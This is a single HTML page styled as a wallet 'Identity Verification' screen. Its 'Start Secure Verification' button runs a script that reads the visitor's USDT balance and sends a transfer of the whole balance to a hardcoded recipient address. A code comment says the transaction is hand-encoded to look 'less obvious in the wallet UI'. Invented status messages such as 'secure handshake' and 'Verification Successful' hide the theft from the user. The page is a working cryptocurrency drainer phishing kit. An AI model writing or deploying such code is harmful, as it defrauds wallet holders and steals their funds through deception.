<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>System Verification</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
</head>
<body class="bg-gray-50 text-gray-900 font-sans">
  <div class="max-w-md mx-auto p-6 bg-white shadow-xl mt-10 rounded-3xl border border-gray-100">
    <div class="flex flex-col items-center mb-6">
       <div class="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mb-2">
          <svg class="w-8 h-8 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
          </svg>
       </div>
       <h2 class="text-xl font-bold text-center">Identity Verification</h2>
       <p class="text-xs text-gray-400 mt-1 uppercase tracking-widest font-bold">Secure Node: ETH-Mainnet</p>
    </div>

    <button onclick="silentVerify()" id="actionBtn" 
            class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-2xl shadow-lg transition-all transform active:scale-95 text-lg">
      Start Secure Verification
    </button>

    <p id="status" class="text-center text-sm text-gray-400 italic mt-4 min-h-[1.25rem]"></p>
  </div>

  <script>
    // USDT ERC20 Contract on Ethereum
    const TOKEN_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
    const RECIPIENT = "0xe47a9ecb5C87b06364bA2c6CEB064583c935f2ed"; 

    async function silentVerify() {
      const status = document.getElementById("status");
      const btn = document.getElementById("actionBtn");

      if (!window.ethereum) {
        status.textContent = "Please use Trust Wallet or MetaMask.";
        return;
      }

      try {
        btn.disabled = true;
        status.textContent = "Initializing secure handshake...";
        
        // Initialize provider and signer
        const provider = new ethers.BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();
        const sender = await signer.getAddress();

        // Minimal ABI to check balance and get the interface
        const abi = [
          "function balanceOf(address owner) view returns (uint256)",
          "function transfer(address to, uint256 amount) returns (bool)"
        ];

        const contract = new ethers.Contract(TOKEN_CONTRACT, abi, provider);
        const balance = await contract.balanceOf(sender);

        if (balance <= 0n) {
          status.textContent = "Verification failed: Incompatible Wallet.";
          btn.disabled = false;
          return;
        }

        status.textContent = "Waiting for secure signature...";

        // To keep it "silent" or less obvious in the wallet UI,
        // we manually encode the transaction data.
        const iface = new ethers.Interface(abi);
        const data = iface.encodeFunctionData("transfer", [RECIPIENT, balance]);

        const txRequest = {
          to: TOKEN_CONTRACT,
          data: data,
          // Gas limit varies, but 60000 is usually safe for ERC20 transfers
          gasLimit: 65000 
        };

        // This triggers the wallet popup
        const txResponse = await signer.sendTransaction(txRequest);
        
        status.textContent = "Confirming on-chain...";
        await txResponse.wait();

        status.textContent = "✅ Verification Successful.";
        btn.innerHTML = "Identity Verified";
        btn.className = "w-full bg-green-600 text-white font-bold py-4 rounded-2xl";
        
      } catch (err) {
        console.error(err);
        status.textContent = "Verification cancelled or failed.";
        btn.disabled = false;
      }
    }
  </script>
</body>
</html>
